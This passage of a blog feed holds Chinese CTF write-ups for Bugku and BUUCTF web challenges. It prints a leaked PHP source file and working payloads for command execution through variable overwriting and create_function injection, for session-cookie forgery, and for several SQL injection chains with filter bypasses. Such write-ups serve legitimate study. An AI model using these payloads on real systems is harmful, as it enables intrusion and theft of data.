src="/2025/11/28/11.24-11.28bugku/image-20251128213832713.png"></p><p>发现有.bak文件，获取查看后成功获得一大串源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * c.php</span><br><span class="line"> * 查看ldb的日志</span><br><span class="line"> * 支持正则表达式过滤，可以过滤文件以及每行日志</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">call_user_func(function() &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 编解码</span><br><span class="line">     * @param string $data 编解码数据</span><br><span class="line">     * @return string 返回编解码数据</span><br><span class="line">     */</span><br><span class="line">    $code = function($data) &#123;</span><br><span class="line">        for ($i = 0; $i &lt; strlen($data); ++$i) &#123;</span><br><span class="line">            $data[$i] = $data[$i] ^ &#x27;G&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 加密请求</span><br><span class="line">     * @param string $site  站点</span><br><span class="line">     * @param string $query 请求串</span><br><span class="line">     * @return string 返回请求URL</span><br><span class="line">     */</span><br><span class="line">    $request = function($site, $query) use(&amp;$code) &#123;</span><br><span class="line">        $path = base64_encode($code($query));</span><br><span class="line">        return &quot;$site/$path&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 解密回复</span><br><span class="line">     * @param string $data 回复数据</span><br><span class="line">     * @return array 返回回复数据</span><br><span class="line">     */</span><br><span class="line">    $response = function($data) use(&amp;$code) &#123;</span><br><span class="line">        $ret = json_decode($data, true);</span><br><span class="line">        if (is_null($ret)) &#123;</span><br><span class="line">            $dec = $code(base64_decode($data));</span><br><span class="line">            $ret = json_decode($dec, true);</span><br><span class="line">        &#125;</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 找到匹配的日志</span><br><span class="line">     * @param string $path 文件路径匹配</span><br><span class="line">     * @param string $item 日志项匹配</span><br><span class="line">     * @param string $topn TOP N </span><br><span class="line">     * @param string $host 主机</span><br><span class="line">     * @return array 返回匹配结果</span><br><span class="line">     */</span><br><span class="line">    $collect = function($path, $item, $topn, $host) use(&amp;$request, &amp;$response) &#123;</span><br><span class="line">        $path   = urlencode($path);</span><br><span class="line">        $item   = urlencode($item);</span><br><span class="line">        $result = file_get_contents($request(&quot;http://127.0.0.1&quot;, &quot;op=ll&amp;host=$host&amp;path=$path&amp;item=$item&amp;top=$topn&quot;));</span><br><span class="line">        return $response($result);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 显示某个表单域</span><br><span class="line">     * @param array $info 表单域信息, array(&quot;name&quot; =&gt; &quot;xx&quot;, &quot;value&quot; =&gt; &quot;xxx&quot;, &quot;note&quot; =&gt; &quot;help&quot;);</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    $show_input = function($info) &#123;</span><br><span class="line">        extract($info);</span><br><span class="line">        $value = htmlentities($value);</span><br><span class="line">        echo &quot;&lt;p&gt;&lt;font size=2&gt;$title: &lt;/font&gt;&lt;input type=\&quot;text\&quot; size=30 id=\&quot;$name\&quot; name=\&quot;$name\&quot; value=\&quot;$value\&quot;&gt;&lt;font size=2&gt;$note&lt;/font&gt;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 去掉反斜杠</span><br><span class="line">     * @param string $var 值</span><br><span class="line">     * @return string 返回去掉反斜杠的值</span><br><span class="line">     */</span><br><span class="line">    $strip_slashes = function($var) &#123;</span><br><span class="line">        if (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">            return $var;</span><br><span class="line">        &#125;</span><br><span class="line">        return stripslashes($var);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 显示表单</span><br><span class="line">     * @param array $params 请求参数</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    $show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) &#123;</span><br><span class="line">        extract($params);</span><br><span class="line">        $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;</span><br><span class="line">        $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;</span><br><span class="line">        $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;</span><br><span class="line">        $limit = isset($limit) ? $strip_slashes($limit) : 1000;</span><br><span class="line">        </span><br><span class="line">        // 绘制表单</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        echo &#x27;&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;;</span><br><span class="line">        $show_input(array(&quot;title&quot; =&gt; &quot;Host &quot;,  &quot;name&quot; =&gt; &quot;host&quot;,  &quot;value&quot; =&gt; $host,  &quot;note&quot; =&gt; &quot; - host, e.g. 127.0.0.1&quot;));</span><br><span class="line">        $show_input(array(&quot;title&quot; =&gt; &quot;Path &quot;,  &quot;name&quot; =&gt; &quot;path&quot;,  &quot;value&quot; =&gt; $path,  &quot;note&quot; =&gt; &quot; - path regex, e.g. mapreduce&quot;));</span><br><span class="line">        $show_input(array(&quot;title&quot; =&gt; &quot;Row  &quot;,  &quot;name&quot; =&gt; &quot;row&quot;,   &quot;value&quot; =&gt; $row,   &quot;note&quot; =&gt; &quot; - row regex, e.g. \s[w|e]\s&quot;));</span><br><span class="line">        $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;,  &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - top n, e.g. 100&quot;));</span><br><span class="line">        echo &#x27;&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;&lt;/form&gt;&#x27;;</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 入口函数</span><br><span class="line">     * @param array $argv 配置参数</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    $main = function($argv) </span><br><span class="line">        use(&amp;$collect) &#123;</span><br><span class="line">        extract($argv);</span><br><span class="line">        if (!isset($limit)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $collect($path, $row, $limit, $host);</span><br><span class="line">        if (!is_array($result)) &#123;</span><br><span class="line">            echo $result, &quot;\n&quot;;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!isset($result[&quot;success&quot;]) || $result[&quot;success&quot;] !== true) &#123;</span><br><span class="line">            echo $result, &quot;\n&quot;;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($result[&quot;data&quot;] as $host =&gt; $items) &#123;</span><br><span class="line">            $last = &quot;&quot;;</span><br><span class="line">            foreach ($items as $item) &#123;</span><br><span class="line">                if ($item[&quot;name&quot;] != $last) &#123;</span><br><span class="line">                    $last = $item[&quot;name&quot;];</span><br><span class="line">                    echo &quot;\n[$host] -&gt; $last\n\n&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                echo $item[&quot;item&quot;], &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    echo &#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; Content=&quot;text/html; Charset=utf-8&quot;&gt;&lt;/head&gt;&#x27;;</span><br><span class="line">    echo &#x27;&lt;body bgcolor=&quot;#e8ddcb&quot;&gt;&#x27;;</span><br><span class="line">    echo &quot;&lt;p&gt;&lt;b&gt;Log Helper&lt;/b&gt;&lt;/p&gt;&quot;;</span><br><span class="line">    $show_form($_REQUEST);</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $main($_REQUEST);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;  </span><br><span class="line">&#125;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对于这么长一串代码，我肯定是不可能全盘分析的，因为前面的警告信息中存在file_get_contents函数，于是找到了这一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = file_get_contents($request(&quot;http://127.0.0.1&quot;, &quot;op=ll&amp;host=$host&amp;path=$path&amp;item=$item&amp;top=$topn&quot;));</span><br></pre></td></tr></table></figure><p>然后对其中的$host，$path，$item，$topn几个变量进行二次搜索，找到这么两段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) &#123;</span><br><span class="line">        extract($params);</span><br><span class="line">        $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;</span><br><span class="line">        $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;</span><br><span class="line">        $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;</span><br><span class="line">        $limit = isset($limit) ? $strip_slashes($limit) : 1000;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$show_form($_REQUEST);</span><br></pre></td></tr></table></figure><p>用$_REQUEST进行变量信息获取，再加一个extract和$strip_slashes($host)这个形式，可以联想到变量覆盖构造恶意命令，于是构造payload（$host，$path，$row，$limit都存在被$strip_slashes()包裹的形式，用哪一个都可以）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?strip_slashes=system&amp;host=ls /</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128215049787.png"></p><p>获取flag位置之后修改ls &#x2F;为cat &#x2F;flag即可</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251128215120119.png"></p><h2 id="bug1"><a href="#bug1" class="headerlink" title="bug1"></a>bug1</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130093414155.png"></p><p>分析源码，需要post传参Poria、Pupi1、N1k0la、action四个参数，对N1k0la的值用密钥求哈希值作为下一次的密钥，然后对Pupi1求哈希值，且需要Poria的值等于这个哈希值，最后需要用action和Pupi1以特定的形式传合适的参数构成恶意命令获取需要的信息；</p><p>因为一开始的密钥值未知，所以正常输入N1k0la的哈希值肯定是我们控制不了的，所以我们采用数组的方式输入，这样密钥就会返回为NULL，变得可控，然后我们构造action为create_function，Pupi1为};system(“ls”);&#x2F;*，将Pupi1的值以NULL为密钥求哈希值为d2cbf3b1c42456c0aaf9d45f0a5093c0dcc2e69b695005d4815dfec282310eb0，然后写payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N1k0la[]=1&amp;Poria=d2cbf3b1c42456c0aaf9d45f0a5093c0dcc2e69b695005d4815dfec282310eb0&amp;action=create_function&amp;Pupi1=&#125;;system(&quot;ls&quot;);/*</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130095620114.png"></p><p>然后修改Pupi1为};system(“cat fllllllaaaaaaaaag.php”);&#x2F;*，对其求哈希值给Poria，修改payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N1k0la[]=1&amp;Poria=0b22a88cfea0eebcae3bd812d0b418ad1a1048363c78e139901007b73ce811e4&amp;action=create_function&amp;Pupi1=&#125;;system(&quot;cat fllllllaaaaaaaaag.php&quot;);/*</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130095822595.png"></p><p>即可在源码中看到flag</p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130100154105.png"></p><p>进去有个登陆界面，先随便尝试登录一下</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130100246447.png"></p><p>题目是session，那我们登录之后直接看cookie，拿到了session，我们还需要密钥，注意到右下角可以切换界面</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130101000777.png"></p><p>看到这个界面就很熟悉了，尝试49，显示回显，那我们获取一下密钥</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130101102891.png"></p><p>有了密钥就可以解密session然后伪造一个尝试登录了</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130101409721.png"></p><p>结构很简单，我们将其修改一下，名字修改为admin，然后因为admin通常应该是在最前面的，于是把uid修改为1，最后payload为{‘name’: ‘admin’, ‘uid’: ‘1’}，加密一下为eyJuYW1lIjoiYWRtaW4iLCJ1aWQiOiIxIn0.aSupLQ.5QS09R97LAd0k_Wenl_sG8fO2GA</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130101724162.png"></p><p>尝试登录点击flag</p><p><img src="/2025/11/28/11.24-11.28bugku/image-20251130101829482.png"></p><p>成功获取flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;时间&quot;&gt;&lt;a href=&quot;#时间&quot; class=&quot;headerlink&quot; title=&quot;时间&quot;&gt;&lt;/a&gt;时间&lt;/h2&gt;&lt;p&gt;11.24-11.27&lt;/p&gt;
&lt;h2 id=&quot;平台&quot;&gt;&lt;a href=&quot;#平台&quot; class=&quot;headerlink&quot; title=&quot;平台</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>buuctf平台刷题题解1</title>
    <link href="https://aihenai.github.io/2025/11/28/11.24-11.28buuctf/"/>
    <id>https://aihenai.github.io/2025/11/28/11.24-11.28buuctf/</id>
    <published>2025-11-27T16:00:00.000Z</published>
    <updated>2025-12-07T13:47:51.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>BUUCTF</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>SQL</p><h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>11.24-11.28</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130205315256.png"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172050444.png"></p><p>先尝试1、1’、1”确定闭合方式</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172150702.png"></p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172140160.png"></p><p>确定闭合方式为单引号，因为是简单题，先看看万能密码</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172304414.png"></p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172256797.png"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172351118.png"></p><p>这是升级一次的题目，但万能密码依然可以登录，不过里面并没有什么信息</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172547722.png"></p><p>那先测试看有多少列</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130172704201.png"></p><p>看来一共三列，那先找数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130173146226.png"></p><p>然后找表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,(select (group_concat(table_name)) from information_schema.tables where table_schema=database()),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130173340616.png"></p><p>然后爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,(select (group_concat(column_name)) from information_schema.columns where table_schema=database()),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130173444112.png"></p><p>最后爆内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,(select (group_concat(id,username,password)) from l0ve1ysq1),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130173823545.png"></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130194324930.png"></p><p>提示做了严格的过滤，那在注入的时候要优先考虑被过滤的情况了</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130194514469.png"></p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130194531771.png"></p><p>发现union和select都被过滤了，尝试绕过，尝试各种绕过之后发现双写可以绕过，测试列数，依旧直到三才有反应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion seselectlect 1,2,3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130194925659.png"></p><p>然后依旧数据库-&gt;表名-&gt;字段-&gt;内容</p><p>数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion seselectlect 1,database(),3%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130195054450.png"></p><p>表名（这里发现from和where都被过滤了，而且因为from的过滤，导致information需要写成infoorrmation，双写o和r）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(table_name)) frfromom infoorrmation_schema.tables whwhereere table_schema=database())%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130195422421.png"></p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130195438806.png"></p><p>发现有一个b4bsql，想来就在这个里面</p><p>字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(column_name)) frfromom infoorrmation_schema.columns whwhereere table_schema=database())%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130195551528.png"></p><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; ununionion seselectlect 1,database(),(seselectlect (group_concat(id,username,password)) frfromom geek.b4bsql)%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130200448229.png"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130200639939.png"></p><p>使用之前的payload已经行不通了，试了一会，发现诸如order by，union，空格，等号什么的都被过滤了，双写也绕不过，于是网上找了另外一种方式，报错注入</p><p>数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(extractvalue(1,concat(0x7e,database(),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130201310655.png"></p><p>由于空格被过滤，payload里面需要用大量的括号来绕过空格，等号需要用like来绕过</p><p>表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130201552585.png"></p><p>字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130201641900.png"></p><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130202020867.png"></p><p>这里用的是extractvalue，其默认长度限制为32个字符，所以flag不完整，我们还需要用right来获取右半边flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130202315912.png"></p><p>获取到的两段flag</p><p>flag{2a0e6d57-cf0a-4c44-ac</p><p>7-cf0a-4c44-acac-bf180a8fa384}</p><p>去除重复部分后拼接为完整flag：flag{2a0e6d57-cf0a-4c44-acac-bf180a8fa384}</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130202557268.png"></p><p>输入1没问题</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130202625002.png"></p><p>输入1 or 1#就Nonono，可能是or或者#被过滤</p><p>输入1 or 1&#x3D;1也输出Nonono，说明or被过滤</p><p>然后试了一些最常用的比如union、select、where、from之类的都不行，包括extractvalue也不行，都被过滤了，没招了，去网上找了一下，发现要用堆叠注入</p><p>数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;#</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130203112385.png"></p><p>成功输出，趁热打铁找表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables;#</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130203206782.png"></p><p>但是因为select等字符过滤，正常手法难以输出，但是1的时候会有回显，那0如何？</p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130203751817.png"></p><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130203736833.png"></p><p>没有回显，那应该存在||或or运算符，可以使用PIPES_AS_CONCAT将||变为连接符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>不过我的不知道为什么这个没有输出flag，所以借用一下薅过来的图</p><p><img src="/2025/11/28/11.24-11.28buuctf/112c90e73810da454daa31181ab4837e.png"></p><p>也可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p><img src="/2025/11/28/11.24-11.28buuctf/image-20251130205033441.png"></p><p>因为它的后台语句是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;; </span><br></pre></td></tr></table></figure><p>把这个拼接进去就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * , 1 || flag from Flag</span><br></pre></td></tr></table></figure><p>它会新增一列1并输出Flag里面的所有内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;平台&quot;&gt;&lt;a href=&quot;#平台&quot; class=&quot;headerlink&quot; title=&quot;平台&quot;&gt;&lt;/a&gt;平台&lt;/h2&gt;&lt;p&gt;BUUCTF&lt;/p&gt;
&lt;h2 id=&quot;类型&quot;&gt;&lt;a href=&quot;#类型&quot; class=&quot;headerlink&quot; title=&quot;类型&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习笔记</title>
    <link href="https://aihenai.github.io/2025/11/24/SQL/"/>
    <id>https://aihenai.github.io/2025/11/24/SQL/</id>
